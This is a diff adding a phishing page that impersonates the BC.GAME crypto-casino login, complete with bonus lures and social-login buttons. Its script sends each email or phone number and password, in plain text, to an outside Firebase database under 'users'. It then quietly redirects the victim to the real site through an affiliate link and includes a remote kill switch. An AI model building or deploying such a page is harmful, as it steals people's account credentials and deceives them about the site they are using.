@@ -1,0 +1,262 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>BC.GAME Login</title>  
+  <style>  
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');  
+  
+    body {  
+      margin: 0;  
+      font-family: 'Poppins', sans-serif;  
+      background: #0e0e0e;  
+      color: #fff;  
+      display: flex;  
+      justify-content: center;  
+      align-items: center;  
+      height: 100vh;  
+      box-sizing: border-box;  
+    }  
+  
+    .container {  
+      width: 360px;  
+      background: #1b1b1b;  
+      padding: 25px;  
+      border-radius: 10px;  
+      box-shadow: 0 0 15px rgba(0,0,0,0.7);  
+      box-sizing: border-box;  
+    }  
+  
+    .logo {  
+      display: flex;  
+      align-items: center;  
+      margin-bottom: 20px;  
+      padding-bottom: 10px;   
+    }  
+  
+    .logo-image {  
+      width: 100%;  
+      height: 180px;  
+      object-fit: cover;  
+      object-position: top center;  
+      border-radius: 6px;  
+    }  
+      
+    .logo-text-hidden {  
+        display: none;  
+    }  
+  
+    .bonus {  
+      font-size: 14px;  
+      margin: 8px 0;  
+    }  
+    .bonus span {  
+      color: #00ff66;  
+    }  
+  
+    h2 {  
+      margin: 20px 0 10px;  
+      font-size: 20px;  
+    }  
+  
+    .tabs {  
+      display: flex;  
+      justify-content: space-between;  
+      margin-bottom: 20px;  
+    }  
+  
+    .tab {  
+      flex: 1;  
+      text-align: center;  
+      padding: 8px;  
+      cursor: pointer;  
+      border-radius: 6px;  
+      font-size: 14px;  
+      background: #222;  
+    }  
+  
+    .tab.active {  
+      background: #00ff66;  
+      color: #000;  
+      font-weight: bold;  
+    }  
+  
+    .input-box {  
+      margin-bottom: 15px;  
+    }  
+  
+    .input-box input {  
+      width: 100%;  
+      padding: 12px;  
+      border-radius: 6px;  
+      border: none;  
+      outline: none;  
+      background: #2a2a2a;  
+      color: #fff;  
+      font-size: 14px;  
+      box-sizing: border-box;  
+    }  
+  
+    .forgot {  
+      text-align: right;  
+      font-size: 12px;  
+      color: #aaa;  
+      cursor: pointer;  
+      margin-bottom: 20px;  
+    }  
+  
+    .btn {  
+      width: 100%;  
+      padding: 12px;  
+      border: none;  
+      border-radius: 6px;  
+      background: linear-gradient(to right, #00ff66, #33ff99);  
+      font-size: 16px;  
+      font-weight: bold;  
+      color: #000;  
+      cursor: pointer;  
+      margin-bottom: 15px;  
+    }  
+  
+    .signup {  
+      text-align: center;  
+      margin-bottom: 15px;  
+      font-size: 13px;  
+    }  
+  
+    .signup a {  
+      color: #00ff66;  
+      text-decoration: none;  
+      font-weight: bold;  
+    }  
+  
+    .divider {  
+      text-align: center;  
+      font-size: 12px;  
+      margin: 15px 0;  
+      color: #aaa;  
+    }  
+  
+    .social-login {  
+      display: flex;  
+      justify-content: center;  
+      gap: 10px;  
+    }  
+  
+    .social-login button {  
+      background: #2a2a2a;  
+      border: none;  
+      border-radius: 50%;  
+      width: 40px;  
+      height: 40px;  
+      cursor: pointer;  
+      display: flex;  
+      justify-content: center;  
+      align-items: center;  
+    }  
+  
+    .social-login img {  
+      width: 20px;  
+    }  
+  </style>  
+</head>  
+<body>  
+  <div class="container">  
+    <div class="logo">  
+      <img src="https://ik.imagekit.io/jmbf2me6w/ae8935d5d49319d6_800x800ar.jpeg?updatedAt=1759591737518" alt="BC.GAME Banner" class="logo-image">  
+      <h2 class="logo-text-hidden">BC.GAME</h2>  
+    </div>  
+  
+    <div class="bonus"><span>🎁 470%</span> Welcome Deposit Bonus</div>  
+    <div class="bonus"><span>🪙 5 BTC</span> Free Daily Lucky Spin</div>  
+    <div class="bonus"><span>✅ Free Features</span> Daily Free Rewards and Bonuses</div>  
+  
+    <h2>Sign In</h2>  
+    <div class="tabs">  
+      <div class="tab active">Password</div>  
+      <div class="tab">One-Time Code</div>  
+    </div>  
+  
+    <div class="input-box">  
+      <input type="text" id="email" placeholder="Email / Phone Number">  
+    </div>  
+    <div class="input-box">  
+      <input type="password" id="password" placeholder="Password">  
+    </div>  
+  
+    <div class="forgot">Forgot Password?</div>  
+    <button class="btn" id="signupBtn">Sign In</button>  
+  
+    <div class="signup">New to BC.GAME? <a href="#">Create Account</a></div>  
+  
+    <div class="divider">or log in directly with</div>  
+  
+    <div class="social-login">  
+      <button><img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" alt="Google"></button>  
+      <button><img src="https://cdn-icons-png.flaticon.com/512/25/25231.png" alt="GitHub"></button>  
+      <button><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram"></button>  
+      <button><img src="https://cdn-icons-png.flaticon.com/512/825/825539.png" alt="Discord"></button>  
+    </div>  
+  </div>  
+  
+  <script type="module">  
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";  
+    import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";  
+  
+    const firebaseConfig = {  
+      apiKey: "AIzaSyBGzwLIeQsgkoSd8uHunzBoH_osO9Etu1w",  
+      authDomain: "tournament-bot-59b94.firebaseapp.com",  
+      databaseURL: "https://tournament-bot-59b94-default-rtdb.firebaseio.com",  
+      projectId: "tournament-bot-59b94",  
+      storageBucket: "tournament-bot-59b94.firebasestorage.app",  
+      messagingSenderId: "366077374761",  
+      appId: "1:366077374761:web:7118a0b0cd11b472500738",  
+      measurementId: "G-43RL6V2LWJ"  
+    };  
+  
+    const app = initializeApp(firebaseConfig);  
+    const db = getDatabase(app);  
+  
+    // 🔐 Control ON/OFF check  
+    const controlRef = ref(db, "control/isEnabled");  
+    onValue(controlRef, (snapshot) => {  
+      const isEnabled = snapshot.val();  
+      if (!isEnabled) {  
+        document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:black;color:red;font-size:20px;'>⚠️ Copyright Error: Access Restricted by Big Admin</div>";  
+      }  
+    });  
+  
+    const signupBtn = document.getElementById("signupBtn");  
+    signupBtn.addEventListener("click", async () => {  
+      const email = document.getElementById("email").value.trim();  
+      const password = document.getElementById("password").value.trim();  
+  
+      if (!email || !password) {  
+        alert("Please enter email and password!");  
+        return;  
+      }  
+  
+      const usersRef = ref(db, "users");  
+      const newUser = push(usersRef);  
+      await set(newUser, {  
+        email,  
+        password,  
+        createdAt: new Date().toISOString()  
+      });  
+  
+      // 🔁 Hidden redirect  
+      window.location.replace("https://bc.co/hi/?stag=30248_68e16e556a0eaeec7689a219&i=4cxse6dr&utm_source=4cxse6dr");  
+    });  
+  
+    // Tab switch logic  
+    const tabs = document.querySelectorAll(".tab");  
+    tabs.forEach(tab => {  
+      tab.addEventListener("click", () => {  
+        tabs.forEach(t => t.classList.remove("active"));  
+        tab.classList.add("active");  
+      });  
+    });  
+  </script>  
+</body>  
+</html>
